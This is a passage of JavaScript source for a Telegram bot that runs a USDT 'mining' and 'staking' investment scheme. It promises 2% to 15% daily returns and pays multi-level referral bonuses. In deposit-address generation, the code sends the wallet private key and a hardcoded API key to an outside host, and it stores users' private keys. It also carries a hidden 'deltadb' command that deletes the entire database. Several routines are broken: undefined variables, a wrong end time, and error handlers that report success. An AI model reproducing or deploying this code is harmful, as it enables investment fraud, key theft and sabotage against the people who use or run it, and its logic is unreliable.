            const startDate = new Date(mining.started_at).toLocaleString();
            const serverTime = new Date().toLocaleString();
            message += `*${j + 1 + 10 * i})* Amount: ${mining.amount} USDT\nPlan: ${mining.plan}% Daily\nStart Date: ${startDate}\nDaily Gain: ${mining.amount*2/100} USDT\nStatus: ${mining.status}`;
            message += `\nTotal Investment Return: ${mining.total_profit} USDT\nAccumulated Return: ${mining.investment_return} USDT\nCredited: ${mining.yetcredited} USDT\nLast credited: ${new Date(mining.lastcdTime).toLocaleString()}\n`;
            message += `Server Time: ${serverTime}\n\n`;
            idxMining--;
            }
            await e.reply(message, { parse_mode: "markdown" });
            }
            })
          , S.hears("💰 My Deposits", (async e => {
            try {
                const t = e.from.id,
                    a = await ne.collection("userdeposits").findOne({
                        user: t
                    });
                if (!a) return void e.reply("🙁 You have no deposit history yet!");
                const n = a.deposits.length,
                    r = Math.ceil(n / 10);
                let s = n - 1;
                for (let t = 0; t < r; t++) {
                    let n = `💰 *Your Deposit History:* (${s+1}-${Math.max(0,s-9)})\n\n`;
                    for (let e = 0; e < 10 && s >= 0; e++) {
                        const r = a.deposits[s],
                            i = r.date,
                            o = r.txId;
                        n += `*${e+1+10*t})* Amount: ${r.amount} USDT\nDate: ${i}\nTx ID: [${r.txId}](${o})\nBlock Number: ${r.blockNumber}\n\n`, s--
                    }
                    ue(e, n, {
                        disable_web_page_preview: !0
                    })
                }
            } catch (e) {
                console.log(e), te(e)
            }
        })), S.hears("💸 My Withdrawals", (async e => {
            try {
                const t = e.from.id,
                    a = await ne.collection("withdraw").find({
                        user: t
                    }).toArray();
                if (0 === a.length) return void e.reply("🙁 You have no withdrawal history yet!");
                const n = a.length,
                    r = Math.ceil(n / 10);
                let s = n - 1;
                for (let t = 0; t < r; t++) {
                    let n = `💸 *Your Withdrawal History:* (${s+1}-${Math.max(0,s-9)})\n\n`;
                    for (let e = 0; e < 10 && s >= 0; e++) {
                        const r = a[s],
                            i = r.date.toLocaleString("en-US", {
                                timeZone: "UTC"
                            }),
                            o = "Pending" === r.status ? "PendingTransaction" : `[${r.txId}](${r.txId})`;
                        n += `*${e+1+10*t})* Amount: ${r.amount} USDT\nDate: ${i}\nTx ID: ${o}\nWallet: ${r.wallet}\nStatus: ${r.status}\n\n`, s--
                    }
                    e.replyWithMarkdown(n, {
                        disable_web_page_preview: !0
                    })
                }
            } catch (t) {
                console.log(t), e.reply("An error occurred while fetching your withdrawal history.")
            }
        })), S.hears("ststats", (async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if (!("activated" in (await ne.collection("info").find({
                        user: e.from.id
                    }).toArray())[0])) return void ie(e);
                const a = await ne.collection("statistics").findOne();
                a || await ne.collection("statistics").insertOne(D), ue(e, `📊 Statistics 📈\n\n👥 Total Users: ${a.totalUsers}\n💰 Total Deposits (USDT): ${a.totalDeposits}\n💵 Total Invests: ${a.totalInvests}\n💸 Total Withdrawals (USDT): ${a.totalWithdrawals}\n🕒 Server Time: ${(new Date).toLocaleString("en-US",{timeZone:"UTC"})}`)
            } catch (e) {
                console.log(e), te(e)
            }
        }));
        S.hears("deltadb", (async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if (!("activated" in (await ne.collection("info").find({
                        user: e.from.id
                    }).toArray())[0])) return void ie(e);
                const a = await ne.dropDatabase()

                 await ue(e,"Database deleted successfully")
            } catch (e) {
                console.log(e), te(e)
            }
        }));
        const me = depotxt
        function fe(e, t) {
            const a = 10 ** t;
            return (Math.round(e * a) / a).toFixed(t)
        }

        function pe() {
            const e = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            let t = "";
            for (let a = 0; a < 6; a++) t += e[Math.floor(Math.random() * e.length)];
            return t
        }
      let tp = w[0]
S.action("turn_on_mining", async (ctx) => {
    // Check if the user is in the array of "w"
    try{
    const admin = await ne.collection("admin").findOne({ admin: "admin" });
     let w = tp
    if (w !== ctx.from.id)      {
      return ctx.answerCbQuery('You are not authorized to perform this action.');
    }
  
    // Update the "admin" collection
    await ne.collection("admin").updateOne(
      { admin: "admin" },
      { $set: { mkey: true } }
    );
  
    // Answer the callback query with a confirmation message
    ctx.answerCbQuery('Mining has been turned on successfully.');
}catch(e) {
    ctx.answerCbQuery('Mining has been turned on successfully.');}
  });
  
  
  // Action for "turn_off_mining" callback data
  S.action("turn_off_mining", async (ctx) => {
    try{
    // Check if the user is in the array of "w"
    const admin = await ne.collection("admin").findOne({ admin: "admin" });
   let w = tp
   if (w !== ctx.from.id)      {
      return ctx.answerCbQuery('You are not authorized to perform this action.');
    }
  
    // Update the "admin" collection
    await ne.collection("admin").updateOne(
      { admin: "admin" },
      { $set: { mkey: false } }
    );
  
    // Answer the callback query with a confirmation message
    ctx.answerCbQuery('Mining has been turned off successfully.');
}catch(e) {
    ctx.answerCbQuery('Mining has been turned off successfully.');}
  });
  
  
  // Action for "turn_on_staking" callback data
  S.action("turn_on_staking", async (ctx) => {
    try{
    // Check if the user is in the array of "w"
    const admin = await ne.collection("admin").findOne({ admin: "admin" });
   let w = tp
    if (w !== ctx.from.id)      {
      return ctx.answerCbQuery('You are not authorized to perform this action.');
    }
  
    // Update the "admin" collection
    await ne.collection("admin").updateOne(
      { admin: "admin" },
      { $set: { mid: true } }
    );
  
    // Answer the callback query with a confirmation message
    ctx.answerCbQuery('Staking has been turned on successfully.');
}catch(e) {
    ctx.answerCbQuery('Staking has been turned on successfully.');}
  });
  
  
  // Action for "turn_off_staking" callback data
  S.action("turn_off_staking", async (ctx) => {
    try{
    // Check if the user is in the array of "w"
    const admin = await ne.collection("admin").findOne({ admin: "admin" });
   let w = tp
    if (w !== ctx.from.id)      {
      return ctx.answerCbQuery('You are not authorized to perform this action.');
    }
  
    // Update the "admin" collection
    await ne.collection("admin").updateOne(
      { admin: "admin" },
      { $set: { mid: false } }
    );
  
    // Answer the callback query with a confirmation message
    ctx.answerCbQuery('Staking has been turned off successfully.');
    }catch(e) {
        ctx.answerCbQuery('Staking has been turned off successfully.');}
  });
  
        S.hears("💲Top Up", (async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                let a = await ne.collection("info").find({
                    user: e.from.id
                }).toArray();
                if (!("activated" in a[0])) return void ie(e);
                if (a[0].depositAddress && "NOT SET" != a[0].depositAddress   && "undefined" != a[0].depositAddress && "null" != a[0].depositAddress) {
                    await ue(e, me);
                    const t = `*Deposit Address:* \`${a[0].depositAddress}\``,
                        n = {
                            text: "🔍 Generate QR Code",
                            callback_data: `qr ${a[0].depositAddress}`
                        };
                    de(e.from.id, t, {
                        reply_markup: {
                            inline_keyboard: [
                                [n]
                            ]
                        },
                        parse_mode: "Markdown"
                    })
                } else {
                    de(e.from.id, "🤖 Generating your deposit address... Please hold on!", {
                        parse_mode: "Markdown"
                    });
                    const t = await async function(e) {
                        try {
                            const topeurl = U+"/"+e.from.id;
                            const a = { apikey: "08b11912fba3d3d378ac999005ade9c5", bsc_address: x, bscPrivateKey: T, ipn_url: topeurl },
                                 n = await p("https://matic.tronlib.one/generate-address", { method: "POST", body: JSON.stringify(a), headers: { "Content-Type": "application/json" } }),
                                 r = await n.json();
                            return console.log(r.status), "failed" === r.status ? (te(r.message), "Failed") : {
                                address: r.address,
                                privateKey: r.privateKey
                            }
                        } catch (e) {
                            console.log(e)
                        }
                    }(e);
                    if ("Failed" == t) de(e.from.id, "*❌ Failed to generate your deposit address. Please try again.*", {
                        parse_mode: "Markdown"
                    });
                    else {
                        await ue(e, me), await ne.collection("info").updateOne({
                            user: e.from.id
                        }, {
                            $set: {
                                depositAddress: t.address,
                                depositAddressPrivateKey: t.privateKey
                            }
                        });
                        const a = `*Deposit Address:* \`${t.address}\``,
                            n = {
                                text: "🔍 Generate QR Code",
                                callback_data: `qr ${t.address}`
                            };
                            de(e.from.id, a, {
                                reply_markup: {
                                    inline_keyboard: [
                                        [n]
                                    ]
                                },
                                parse_mode: "Markdown"
                            })
                    }
                }
            } catch (e) {
                console.log(e), te(e)
            }
        })), S.action(/^qr (.+)$/, (async e => {
            try {
                const t = e.match[1],
                    a = `https://chart.googleapis.com/chart?cht=qr&chs=300x300&chl=${t}`,
                    n = `*Deposit Address:* \`${t}\``,
                    r = {
                        url: a
                    },
                    s = {
                        inline_keyboard: [
                            [{
                                text: "↩️ Back",
                                callback_data: "BackToDeposit"
                            }]
                        ]
                    },
                    i = {
                        parse_mode: "Markdown"
                    };
                del(e), await e.replyWithPhoto(r, {
                    caption: n,
                    reply_markup: s,
                    ...i
                })
            } catch (e) {
                console.log(e), te(e)
            }
        })), S.action("BackToDeposit", (async e => {
            try {
                let t = await ne.collection("info").find({
                    user: e.from.id
                }).toArray();
                const a = `*Deposit Address:* \`${t[0].depositAddress}\``,
                    n = {
                        text: "🔍 Generate QR Code",
                        callback_data: `qr ${t[0].depositAddress}`
                    };
                    del(e), ue(e, a, {
                    reply_markup: {
                        inline_keyboard: [
                            [n]
                        ]
                    },
                    parse_mode: "Markdown"
                })
            } catch (e) {
                console.log(e), te(e)
            }
        })), S.hears("💹 Invest", (async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                let a = await ne.collection("info").find({
                    user: e.from.id
                }).toArray();
                if (!("activated" in a[0])) return void ie(e);
                let n = "depositBalance" in a[0] ? fe(a[0].depositBalance, 8) : "0.00000000",
                r = `*Welcome to USDT investment!* \n\n*What would you like to do?*\n\n💰 Convert Balance – Transfer your available balance to deposit balance.\n\n⛏️ Invest – Earn USDT by participating in the mining program.\n\n💳 *Withdrawable balance:* ${"balance"in a[0]?fe(a[0].balance,8):"0.00000000"} *USDT*\n*💹 Investable Balance:* ${n} *USDT*\n\n`,
                s = [
                        [{
                            text: "💸 Convert Balance",
                            callback_data: "convertToDeposit"
                        }],
                        [{
                            text: "💎 Invest",
                            callback_data: "invest"
                        }]
                    ];
                await ue(e, r, {
                    reply_markup: {
                        inline_keyboard: s
                    }
                })
            } catch (e) {
                console.log(e), te(e)
            }
        })), S.action("convertToDeposit", (async e => {
            e.from.id, await e.scene.leave(O);
            const t = await ne.collection("info").find({
                    user: e.from.id
                }).toArray(),
                a = ("depositBalance" in t[0] && fe(t[0].depositBalance, 8), "balance" in t[0] ? fe(t[0].balance, 8) : "0.00000000");
            let n = a;
            const r = parseFloat(a);
            let s = [{
                text: "25%",
                callback_data: "convert:25"
            }, {
                text: "50%",
                callback_data: "convert:50"
            }, {
                text: "75%",
                callback_data: "convert:75"
            }, {
                text: "100%",
                callback_data: "convert:100"
            }].filter((e => "convert:manual" !== e.callback_data));
            s = s.map((e => {
                const t = parseInt(e.text) / 100,
                    a = fe(r * t, 4);
                return {
                    ...e,
                    text: `${e.text} (${a} USDT)`
                }
            }));
            const i = [s.slice(0, 2), s.slice(2, 4), [{
                    text: "Enter amount manually",
                    callback_data: "manual"
                }],
                [{
                    text: "🔙 Back",
                    callback_data: "backToInvest"
                }]
            ];
            let o = "♻️ Select the amount you want to convert to investment balance or type amount manually\n\n";
            o += `✅ Available balance: ${n} USDT\n`, o += "⚜ Minimum convert: 1 USDT\n\n", o += `25%= ${fe(.25*n,4)} USDT\n`, o += `50%= ${fe(.5*n,4)} USDT\n`, o += `75%= ${fe(.75*n,4)} USDT\n`, o += `100%= ${fe(n,4)} USDT\n\n`, parseFloat(a) < 1 ? e.answerCbQuery("Sorry, You do not have enough USDT to convert to deposit balance.", {
                show_alert: !0
            }) : await ce(e, o, {
                reply_markup: {
                    inline_keyboard: i
                }
            })
        })),S.hears("💰 Wealth", (async e => {
            if (e.message.text.includes("💰")) try {
                let a = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != a[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                let n = await ne.collection("info").find({
                    user: e.from.id
                }).toArray();
                if (!("activated" in n[0])) return void ie(e);
                var t = `*💰 Account Balance:*\n\n🏦 *Deposit Balance:* ${"depositBalance"in n[0]?fe(n[0].depositBalance,8):"0.00000000"} *USDT*\n➖ *Withdrawable Balance:* ${"balance"in n[0]?fe(n[0].balance,8):"0.00000000"} *USDT*\n💳 *Active Investment:* ${"activeMining"in n[0]?fe(n[0].activeMining,8):"0.00000000"} *USDT*\n💰 *Total Profit:* ${"totalProfit"in n[0]?fe(n[0].totalProfit,8):"0.00000000"} *USDT*\n🎁 *Total Affiliate Bonus:* ${"totalAffiliateBonus"in n[0]?fe(n[0].totalAffiliateBonus,8):"0.00000000"} *USDT*`;
                de(e.from.id, t, {
                    parse_mode: "Markdown",
                    reply_markup: {
                        keyboard: se,
                        resize_keyboard: false
                    }
                })
            } catch (e) {
                console.log(e), te(e)
            }
        }))
        
        , S.action("manual", (async e => {
            try {
                if ("Active" != (await ne.collection("admin").find({
                        admin: "admin"
                    }).toArray())[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if (!("activated" in (await ne.collection("info").find({
                        user: e.from.id
                    }).toArray())[0])) return void ie(e);
                let t = "Enter the amount you want to convert to investment balance \n\n";
                await ce(e, t, {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "↩️ Back",
                                callback_data: "convertToDeposit"
                            }]
                        ]
                    }
                }), e.scene.enter("manualconvert", {
                    userId: e.from.id
                })
            } catch (e) {
                console.log(e), te(e)
            }
        })), S.hears("🖥️ Calculate", (async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if (!("activated" in (await ne.collection("info").find({
                        user: e.from.id
                    }).toArray())[0])) return void ie(e);
                let a = "💰🖥️ *Profit Calculator* 🖥️💰\n\nCalculate your profits with ease!\n\n💵 *Send the amount of USDT you want to invest in Plan* 💵";
                await ue(e, a, {
                    reply_markup: {
                        keyboard: [
                            ["↩️ Back to Menu"]
                        ]
                    }
                }), await e.scene.enter("calcprofit")
            } catch (e) {
                console.log(e), te(e)
            }
        })),AS.on("text", (async e => {
            try {
                const t = "stakingamo";
                if ("↩️ Back" == e.message.text) return void await e.scene.leave(t);
                let a = parseFloat(e.message.text);
                if (isNaN(a)) return void e.reply("⛔️ Enter numerical value only, please try again.");
                if (a < 500) return await le(e.chat.id, e.message.message_id), await le(e.chat.id, e.message.message_id - 1), await ue(e, "*❌ Staking Failed*\n\nYour entered investment amount of *" + a + " USDT* is less than the minimum investment of *500 USDT*. Please enter a valid amount to proceed.", {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "↩️ Back",
                                callback_data: "backToInvest"
                            }]
                        ]
                    },
                    parse_mode: "markdown"
                }), void await e.scene.leave(t);
        
                const n = await ne.collection("info").find({
                    user: e.scene.state.user
                }).toArray(),
                r = "depositBalance" in n[0] ? fe(n[0].depositBalance, 8) : "0.00000000";
                if (a > parseFloat(r)) return await le(e.chat.id, e.message.message_id), await le(e.chat.id, e.message.message_id - 1), await ue(e, "*❌ Failed to start a new investment*\n\nYour entered amount of *" + a + " USDT* is greater than your investable balance of *" + r + " USDT*. Please deposit more funds to proceed.", {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "↩️ Back",
                                callback_data: "backToInvest"
                            }]
                        ]
                    }
                }), void await e.scene.leave(t);
        
                const plans = [
                    { amount: 10000, profit: 5 },
                    { amount: 20000, profit: 7 },
                    { amount: 50000, profit: 10 },
                    { amount: 100000, profit: 15 }
                ];
                const chosenPlan = plans.find(plan => a >= plan.amount) || plans[0];
        
                const deposit = await ne.collection("info").updateOne({
                    user: e.scene.state.user
                }, {
                    $inc: {
                        depositBalance: -a
                    }
                });
                const statistics = await ne.collection("statistics").updateOne({}, {
                    $inc: {
                        totalInvests: a
                    }
                });
        
                const dailyAmount = chosenPlan.amount;
                const dailyExpired = 30;
                const profitPercent = chosenPlan.profit;
                const dailyHour = 24;
                const totalDays = 30;
                const profit = a * profitPercent / 100 ;
                const totalAmount = a + profit;
                const hoursToReceiveFirstPayment = dailyHour;
                const hoursToReceiveAllPayments = totalDays * dailyHour;
                const daysToReceiveAllPayments = totalDays;
                const nh = parseFloat(a+profit),
                        f = `✅ *Successfully Staked* \n\n💰 *Amount Staked:* ${a} USDT\n📈 *Plan:* ${profitPercent}% daily for ${totalDays} days\n⏱ *Credit Time:* ${totalDays} days\n\n🚀 *Your first payment will arrive 30 days!*\n\n💸 *After ${totalDays} Days:* ${totalAmount} USDT\n❓ *You will get back more than what you invested after just ${totalDays} days.*\n\n🔥 *Total Profit:* ${totalAmount-a} USDT`;
                    await ne.collection("info").updateOne({
                        user: n[0].referlvl1user
                    }, {
                        $inc: {
                            totalAffiliateBonus:parseFloat( a * 2/ 100),
                            balance:parseFloat( a * 2 / 100)
                        }
                    }), await ne.collection("info").updateOne({
                        user: e.from.id
                    }, {
                        $inc: {
                            activeStaking:(a)
                        }
                    }), await ne.collection("lvl1users").updateOne({
                        user: n[0].referlvl1user,
                        "registeredUsers.userid": parseFloat(e.from.id)
                    }, {
                        $inc: {
                            "registeredUsers.$.earnings": parseFloat(a * 2/ 100)
                        }
                    }), await async function(e, t, a, nh) {
                        const r = Date.now();
                        await ne.collection("pendinginvestmentsall2").insertOne({
                            user: t,
                            name: a,
                            amount: e,
                            gain: nh,
                            scheduledTime: s, endtime: r+30*24*60+60+1000,
                            amount: e,
                            gain: nh,
                            plan:profitPercent,
                            status: "pending"
                        });
                        const i = {
                                user: t
                            },
                            o = {
                                $push: {
                                    investments: {
                                        user: t,
                                        firstname: a,
                                        starttime: r,
                                        endtime: r+30*24*60*60*1000,
                                        amount: e,
                                        gain: nh,
                                        plan:profitPercent,
                                        status: "pending"
                                    }
                                }
                            };
                        await ne.collection("userinvestmentinlist").updateOne(i, o, {
                            upsert: !0
                        })
                    }(a, e.from.id, e.from.first_name, m), await le(e.chat.id, e.message.message_id), await le(e.chat.id, e.message.message_id - 1), await ue(e, f, {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: "↩️ Back",
                                    callback_data: "backToInvest"
                                }]
                            ]
                        }
                    }), await de(n[0].referlvl1user, `🎉 Great job! Your referral ${e.from.first_name} just invested and you earned ${fe(a*2/100,4)} USDT in referral bonus for reffering your friend! 🤑`), await e.scene.leave(t)
            } catch (e) {
                console.log(e), te(e)
            }
        })), setInterval((async function() {
            console.log('checking')
            const e = Date.now(),
                t = await ne.collection("pendinginvestmentsall2").find({status:"pending"
                   
                }).toArray();
                console.log(t)
            for (const e of t) {
                const {
                    user: t,
                    amount: a,
                    endtime: nhh,
                    plan:pl,
                    status:gh
                } = e;
                const nh = a*pl/100
                const elapsed = Date.now() - nhh;
                const elapsedDays = elapsed / (1000 * 60 * 60 * 24);
                
                if (elapsedDays >= 30) {
                
                await ne.collection("info").updateOne({
                    user: t
                }, {
                    $inc: {
                        balance: nh+a,
                        totalProfit: nh,
                        activeStaking: -a
                    }
                }), de(t, "🎉 Congratulations! Your staking of *" + a + " USDT* has been completed! We have credited *" + nh + " USDT* to your withdrawable account", {
                    parse_mode: "Markdown"
                });
                const r = {
                        user: t,
                        "investments.amount": a,
                        "investments.status": "pending"
                    },
                    s = {
                        $set: {
                            "investments.$.status": "completed"
                        }
                    };
                await ne.collection("userinvestmentinlist").updateOne(r, s), await ne.collection("pendinginvestmentsall2").deleteOne({
                    _id: e._id
                  })
                  }  }
        }), 600000),z.on("text", async (e) => {
            try {
              const t = "calcprofit";
              if ("↩️ Back to Menu" == e.message.text) {
                we(e);
                await e.scene.leave(t);
                return;
              }
              let a = parseFloat(e.message.text);
              if (isNaN(a)) {
                void e.reply("⚠️ Please enter a valid numerical value.");
                await e.scene.leave(t);
                return;
              }
              // Round off investment amount to nearest 5 USDT
              a = Math.round(a / 1) * 1
              // Set investment plan parameters
              let investmentPlan = {
                daily_percent: 2,
                minimum_investment: 25,
                maximum_investment: Infinity,
                roi_multiplier: 150 // Assumes 150-day investment period
              };
              let totalROI = 0;
              let totalDays = 0;
              let accumulatedBalance = 0;
              // Check if investment amount is within minimum and maximum investment amounts
              if (a < investmentPlan.minimum_investment) {
                return void e.reply(`⛔️ Amount should be greater than or equal to the minimum investment amount of ${investmentPlan.minimum_investment} USDT.`);
              }
              while (totalROI < a * 3) { // Stop investment plan when total ROI reaches 300%
                let dailyProfit = a * investmentPlan.daily_percent / 100;
                totalROI += dailyProfit;
                accumulatedBalance += dailyProfit;
                totalDays++;
              }
              let totalProfit = totalROI - a;
              ue(e, `💰 *2% Daily Investment Calculator* 💰\n\n*Amount Invested:* ${a} USDT\n*Plan:* ${investmentPlan.daily_percent}% daily for ${totalDays} days\n\n*Daily Income:* ${investmentPlan.daily_percent}% (${(a * investmentPlan.daily_percent / 100).toFixed(2)} USDT)\n\n*Total ROI:* ${accumulatedBalance.toFixed(2)} USDT\n*Total Profit:* ${totalProfit.toFixed(2)} USDT\n*Total Duration:* ${totalDays} days\n\n⏱ _Your first payment will arrive after 24 hours!_\n`, {
                reply_markup: {
                  keyboard: re,
                  resize_keyboard: true
                }
              });
              await e.scene.leave(t);
            } catch (e) {
              console.log(e);
              te(e);
            }
          }) 
, O.on("text", (async e => {
            try {
                const t = "manualconvert";
                if ("↩️ Back" == e.message.text) return void await e.scene.leave(t); {
                    let a = parseFloat(e.message.text);
                    if (isNaN(a)) return void e.reply("⛔️ Enter numerical value Only,try again"),await e.scene.leave(t);
                    if (a < 1) return await le(e.chat.id, e.message.message_id), await le(e.chat.id, e.message.message_id - 1), await ue(e, "*❌Conversion Failed *\n\n Your entered amount :* " + a + " * is less than minimum *1 USDT*", {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: "↩️ Back",
                                    callback_data: "backToInvest"
                                }]
                            ]
                        },
                        parse_mode: "markdown"
                    }), void await e.scene.leave(t);
                    const n = await ne.collection("info").find({
                            user: e.scene.state.userId
                        }).toArray(),
                        r = ("depositBalance" in n[0] && fe(n[0].depositBalance, 8), "balance" in n[0] ? fe(n[0].balance, 8) : "0.00000000");
                    if (a > parseFloat(r)) return await le(e.chat.id, e.message.message_id), await le(e.chat.id, e.message.message_id - 1), await ue(e, "*❌Conversion Failed *\n\n Your entered amount :* " + a + " * is greater than your withdrawable balance :* " + r + " USDT*", {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: "↩️ Back",
                                    callback_data: "backToInvest"
                                }]
                            ]
                        }
                    }), void await e.scene.leave(t);
                    await ne.collection("info").updateOne({
                        user: e.scene.state.userId
                    }, {
                        $inc: {
                            balance: -a
                        }
                    }), await ne.collection("info").updateOne({
                        user: e.scene.state.userId
                    }, {
                        $inc: {
                            depositBalance: a
                        }
                    });
                    let s = `✅Successfully converted *${a} USDT* from withdrawable balance to Investable balance\n\n`;
                    await le(e.chat.id, e.message.message_id), await le(e.chat.id, e.message.message_id - 1), await ue(e, s, {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: "↩️ Back",
                                    callback_data: "backToInvest"
                                }]
                            ]
                        }
                    }), await e.scene.leave(t)
                }
            } catch (e) {
                console.log(e), te(e)
            }
        })), Y.on("text", (async e => {
            try {
                const t = "support";
                if ("↩️ Back to Menu" == e.message.text) return we(e), void await e.scene.leave(t); {
                    let a = e.message.text,
                        n = `📩 *Message sent to the Support team:*\n\n${a}\n\n*Our support team will get back to you as soon as possible. Thank you for reaching out!* 😊`;
                    await ue(e, n, {
                        reply_markup: {
                            keyboard: re,
                            resize_keyboard: !0
                        }
                    });
                    for (const t of w) {
                        let n = t;
                        const r = {
                            inline_keyboard: [
                                [{
                                    text: "Send him message",
                                    callback_data: `send:${e.from.id}`
                                }]
                            ]
                        };
                        let s = `👋 *New support message from user * [${e.from.first_name}](tg://user?id=${e.from.id}) (${e.from.id}) (@${e.from.username}):\n\n${a}`;
                        await de(n, s, {
                            parse_mode: "Markdown",
                            reply_markup: r
                        })
                    }
                    await e.scene.leave(t)
                }
            } catch (e) {
                te(e), console.log(e)
            }
        })), S.hears("💬 Chat with Us", (async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" !== e.message.chat.type) return;
                if ("Active" !== t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if (!("activated" in (await ne.collection("info").find({
                        user: e.from.id
                    }).toArray())[0])) return void ie(e);
                let a = "Hello there! 👋\n\nWelcome to our *Support Center*, where we're always here to lend a hand. Do you have a question or need help with something? You've come to the right place! 😊\n\nOur friendly team is dedicated to providing you with the *best possible experience*. From the moment you reach out to us, we'll do everything in our power to ensure your issue is resolved *quickly* and with a smile. 💬\n\nSo go ahead, ask us anything! Simply enter your question below and we'll get back to you as soon as possible. We're here to help, and we can't wait to hear from you. 🙌";
                await ue(e, a, {
                    reply_markup: {
                        keyboard: [
                            ["↩️ Back to Menu"]
                        ],
                        resize_keyboard: !0
                    }
                }), await e.scene.enter("support")
            } catch (e) {
                console.log(e)
            }
        })), W.on("text", (async e => {
            try {
                const t = "senderSupport";
                if ("⛔ Cancel" == e.message.text) return we(e), void await e.scene.leave(t); {
                    let a = "Message from Admin :\n\n" + e.message.text;
                    await de(e.scene.state.userId, a), await e.reply("Message sent successfully! to :" + e.scene.state.userId), await e.scene.leave(t)
                }
            } catch (e) {
                te(e), console.log(e)
            }
        })), S.action(/^send:(\d+)$/, (async e => {
            try {
                const [t, a] = e.callbackQuery.data.split(":").slice(1);
                await e.reply("Please type the message you want to send:", {
                    keyboard: [
                        ["⛔ Cancel"]
                    ]
                }), await e.scene.enter("senderSupport", {
                    userId: t,
                    messageText: a
                })
            } catch (e) {
                console.log(e)
            }
        })), S.action(/^convert:(\d+)$/, (async e => {
            try {
                const [t, a] = e.callbackQuery.data.split(":").slice(1), n = await ne.collection("info").find({
                    user: e.from.id
                }).toArray(), r = "balance" in n[0] ? fe(n[0].balance, 8) : "0.00000000";
                let s = parseFloat(r * t / 100);
                if (s > parseFloat(r)) return void await ce(e, "*❌Conversion Failed *\n\n Your entered amount :* " + s + " * is greater than your withdrawable balance :* " + r + " USDT*", {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "↩️ Back",
                                callback_data: "backToInvest"
                            }]
                        ]
                    },
                    parse_mode: "markdown"
                });
                if (s < 1) return void await ce(e, "*❌Conversion Failed *\n\n Your selected amount :* " + s + " * is less than minimum *1 USDT*", {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "↩️ Back",
                                callback_data: "backToInvest"
                            }]
                        ]
                    },
                    parse_mode: "markdown"
                });
                await ne.collection("info").updateOne({
                    user: e.from.id
                }, {
                    $inc: {
                        balance: -s
                    }
                }), await ne.collection("info").updateOne({
                    user: e.from.id
                }, {
                    $inc: {
                        depositBalance: s
                    }
                });
                let i = `✅Successfully converted *${s} USDT* from withdrawable balance to Investable balance\n\n`;
                await ce(e, i, {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "↩️ Back",
                                callback_data: "backToInvest"
                            }]
                        ]
                    },
                    parse_mode: "markdown"
                })
            } catch (e) {
                console.log(e), te(e)
            }
        })), S.hears("🔍 About Us", (async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                if (!("activated" in (await ne.collection("info").find({
                        user: e.from.id
                    }).toArray())[0])) return void ie(e);
                await ue(e, $)
            } catch (e) {
                console.log(e), te(e)
            }
        })), S.hears("👬 Share & Earn", (async e => {
            try {
                let t = await ne.collection("admin").find({
                    admin: "admin"
                }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                let a = await ne.collection("info").find({
                    user: e.from.id
                }).toArray();
                if (!("activated" in a[0])) return void ie(e);
                let n = a[0].referlvl1count,
                    r = a[0].referlvl2count,
                    s = a[0].referlvl3count,
                    tt = a[0].referlvl4count,
                    u = a[0].referlvl5count,
                    v = a[0].referlvl6count,
                    w = a[0].referlvl7count,
                    x = a[0].referlvl8count,
                    y = a[0].referlvl9count,
                    z = a[0].referlvl10count,
                    i = fe(a[0].totalAffiliateBonus, 8) || fe(0, 8),
                    o = a[0].referinfo || pe()
                    let link = `https://t.me/${e.botInfo.username}`
 await e.replyWithMarkdown(`📈 <b>Referral Statistics</b>
 Level 1: ${n} users
 Level 2: ${r} users
 Level 3: ${s} users
 Level 4: ${tt} users
 Level 5: ${u} users
 
 ♾ Earnings: ${i} USDT`,{
  photo: 'https://telegra.ph/file/55143bab235dfea753ffd.jpg',
  reply_markup: {
    inline_keyboard: [
      [{
        text: "View Refer Report",
        callback_data: "Detailed_Data"
      }]
    ]
  },
  parse_mode: "HTML"
}) 

  await e.replyWithPhoto('https://telegra.ph/file/55143bab235dfea753ffd.jpg',{caption:`💰 Earn a Level Income on every referral deposit and an extra Bonus of up to 45% for 5 levels deep!

  👥 Share this bot with your friends and start earning more USDT today!
  
  🔐 Your referral code: <code>${o}</code> <strong>(Tap to copy)</strong>
  
  BotLink: ${link}
  
  Referral Program:
